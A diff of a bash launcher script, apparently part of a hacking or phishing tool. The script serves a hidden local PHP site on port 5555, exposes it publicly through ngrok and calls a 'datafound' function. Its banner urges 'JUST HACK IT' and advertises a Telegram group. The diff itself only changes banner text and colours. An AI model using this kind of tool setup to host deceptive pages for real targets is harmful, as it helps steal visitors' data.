@@ -110,13 +110,13 @@ printf "\e[0m                             \e[38;5;89;48;5;53m▀\e[38;5;127m▄\
 printf "\e[0m                             \e[38;5;91;48;5;55m▀\e[48;5;17m▀\e[38;5;19;48;5;134m▄\e[48;5;56m▄▄\e[48;5;134m▄\e[38;5;90;48;5;17m▀\e[38;5;91;48;5;55m▀\e[0m                         \e[0m\n"
 printf "\e[0m                              \e[38;5;18;48;5;17m▀\e[48;5;24m▀\e[48;5;25m▀▀\e[48;5;18m▀\e[48;5;17m▀\e[0m                          \e[0m\n"
 printf "\e[0m                                                    \e[0m\n"
+printf "\e[0m
+printf "\e[0m                       DON'T ASK TO HACK ! JUST HACK IT ! |lolcat
 printf "\e[0m"
-echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANT TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+>>\e[0m'|lolcat
+echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANTS TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+>>\e[0m'|lolcat
 echo " "
 echo -e " <×•••••••••••••••••• JOIN US ON TELEGRAM ••••••••••••••••••••×>"|lolcat
 echo " "
-echo -e " ××××××××××××××××××××××× TECHNOCYBER.SH | HACKERSPUNK ××××××××××××××××××××××"|lolcat
-echo " " 
 
 }
 
@@ -466,8 +466,8 @@ fi
 start_localhost() {
 
 printf "\e[0m\n"
-echo " ----------------------------------------->>>>>"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m      Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
+echo " ----------------------------------------->>>>>"|lolcat
+printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m      Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
 cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 echo " ----------------------------------------->>>>>"|lolcat
 sleep 2
@@ -496,7 +496,7 @@ printf "\e[0m           \e[38;5;31;48;5;31m                         \e[0m\n"
 printf "\e[0m           \e[38;5;25;48;5;25m                         \e[0m               \e[0m\n"
 printf "\e[0m                                                   \e[0m\n"
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[0m\e[96m http://127.0.0.1:5555\e[0m\n"
+printf " \e[1;31m+ --\e[0m\e[1;77m ==\e[0m\e[1;31m\e[0m\e[1;92m { SUCCESSFULLY HOSTED AT :\e[0m\e[0m\e[96m http://127.0.0.1:5555\e[0m\n"
 
 datafound
 
@@ -505,10 +505,10 @@ datafound
 start_ngrok() {
 
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m/\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
 cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
